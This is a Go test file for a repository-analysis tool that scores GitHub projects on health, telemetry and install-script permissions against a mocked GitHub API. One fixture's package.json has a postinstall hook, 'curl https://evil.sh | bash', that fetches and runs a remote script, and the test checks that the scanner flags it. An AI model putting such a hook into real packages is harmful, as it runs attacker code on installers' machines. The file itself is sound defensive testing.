package analyze

import (
	"context"
	"encoding/base64"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/agenticraptor/readme-radar/internal/github"
	"github.com/agenticraptor/readme-radar/internal/registry"
	"github.com/agenticraptor/readme-radar/internal/report"
)

func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

func fakeGitHub(t *testing.T, pkgJSON string) *httptest.Server {
	t.Helper()
	mux := http.NewServeMux()
	mux.HandleFunc("/repos/acme/widget", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"full_name":"acme/widget","description":"a widget","stargazers_count":4200,
			"forks_count":120,"open_issues_count":30,"language":"TypeScript","default_branch":"main",
			"size":1500,"license":{"spdx_id":"MIT"},"pushed_at":"2026-06-10T00:00:00Z","created_at":"2021-01-01T00:00:00Z"}`))
	})
	mux.HandleFunc("/repos/acme/widget/languages", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"TypeScript":90000,"JavaScript":1000}`))
	})
	mux.HandleFunc("/repos/acme/widget/contributors", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Link", `<x?page=2>; rel="next", <x?page=25>; rel="last"`)
		_, _ = w.Write([]byte(`[{"login":"a"}]`))
	})
	mux.HandleFunc("/repos/acme/widget/releases", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Link", `<x?page=2>; rel="next", <x?page=12>; rel="last"`)
		_, _ = w.Write([]byte(`[{"tag_name":"v3.1.0","published_at":"2026-05-20T00:00:00Z"}]`))
	})
	mux.HandleFunc("/repos/acme/widget/contents/package.json", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"type":"file","encoding":"base64","content":"` + b64(pkgJSON) + `"}`))
	})
	mux.HandleFunc("/", func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusNotFound) })
	return httptest.NewServer(mux)
}

func newTestAnalyzer(ghURL string) *Analyzer {
	return &Analyzer{
		GH:  &github.Client{BaseURL: ghURL, HTTP: http.DefaultClient},
		Reg: &registry.Client{NPMBase: ghURL + "/__nonpkg", PyPIBase: ghURL + "/__nopypi", HTTP: http.DefaultClient},
		Now: func() time.Time { return time.Date(2026, 6, 16, 0, 0, 0, 0, time.UTC) },
	}
}

func TestAnalyzeHealthyGitHubRepo(t *testing.T) {
	pkg := `{"name":"@acme/widget","dependencies":{"react":"^18","lodash":"^4"},"scripts":{"build":"tsc"}}`
	srv := fakeGitHub(t, pkg)
	defer srv.Close()

	a := newTestAnalyzer(srv.URL)
	target := report.Target{Ecosystem: report.EcosystemGitHub, Owner: "acme", Repo: "widget", URL: "https://github.com/acme/widget"}
	rep, err := a.Analyze(context.Background(), target)
	if err != nil {
		t.Fatal(err)
	}
	if rep.Repo.Contributors != 25 || rep.Repo.Releases != 12 {
		t.Errorf("enrich failed: contrib=%d releases=%d", rep.Repo.Contributors, rep.Repo.Releases)
	}
	if rep.Health.Score < 70 {
		t.Errorf("active popular repo should be healthy, got %d", rep.Health.Score)
	}
	if rep.Telemetry.Level != report.LevelGood {
		t.Errorf("clean deps should be telemetry-good, got %v", rep.Telemetry.Level)
	}
	if rep.Permissions.Score < 90 {
		t.Errorf("no install scripts should keep permissions high, got %d", rep.Permissions.Score)
	}
	if rep.Score.Grade == "" || rep.Score.Overall == 0 {
		t.Errorf("missing overall score")
	}
}

func TestAnalyzeFlagsPostinstallAndAnalytics(t *testing.T) {
	pkg := `{"name":"sketchy","dependencies":{"mixpanel":"^1","axios":"^1"},"scripts":{"postinstall":"curl https://evil.sh | bash"}}`
	srv := fakeGitHub(t, pkg)
	defer srv.Close()

	a := newTestAnalyzer(srv.URL)
	target := report.Target{Ecosystem: report.EcosystemGitHub, Owner: "acme", Repo: "widget", URL: "https://github.com/acme/widget"}
	rep, err := a.Analyze(context.Background(), target)
	if err != nil {
		t.Fatal(err)
	}
	if rep.Permissions.Score > 60 {
		t.Errorf("remote-fetch postinstall should tank permissions, got %d", rep.Permissions.Score)
	}
	if len(rep.Permissions.InstallScripts) == 0 {
		t.Errorf("install scripts should be surfaced")
	}
	if rep.Telemetry.Level != report.LevelBad {
		t.Errorf("mixpanel should be telemetry-bad, got %v", rep.Telemetry.Level)
	}
	if rep.Score.Verdict == report.VerdictTrust {
		t.Errorf("sketchy package should not be 'trust'")
	}
}

func TestParsePackageJSON(t *testing.T) {
	pj := parsePackageJSON([]byte(`{"name":"x","dependencies":{"a":"1","node-gyp":"^9"},"scripts":{"postinstall":"node y.js","test":"jest"}}`))
	if pj.name != "x" || !pj.native {
		t.Errorf("parse: %+v", pj)
	}
	if pj.monorepo {
		t.Errorf("named single package should not be flagged monorepo")
	}
	if _, ok := pj.scripts["postinstall"]; !ok {
		t.Errorf("missing postinstall")
	}
	if _, ok := pj.scripts["test"]; ok {
		t.Errorf("non-lifecycle script leaked")
	}
}

func TestParsePackageJSONMonorepo(t *testing.T) {
	for _, src := range []string{
		`{"private":true,"dependencies":{}}`,
		`{"name":"root","workspaces":["packages/*"]}`,
		`{"dependencies":{"a":"1"}}`, // no name → likely a private root
	} {
		if pj := parsePackageJSON([]byte(src)); !pj.monorepo {
			t.Errorf("expected monorepo=true for %s", src)
		}
	}
}

func TestGoModDeps(t *testing.T) {
	mod := "module x\n\ngo 1.22\n\nrequire (\n\tgithub.com/a/b v1.0.0\n\tgithub.com/c/d v2.0.0\n)\n"
	deps := goModDeps([]byte(mod))
	if len(deps) != 2 || !strings.Contains(deps[0], "a/b") {
		t.Errorf("goModDeps = %v", deps)
	}
}
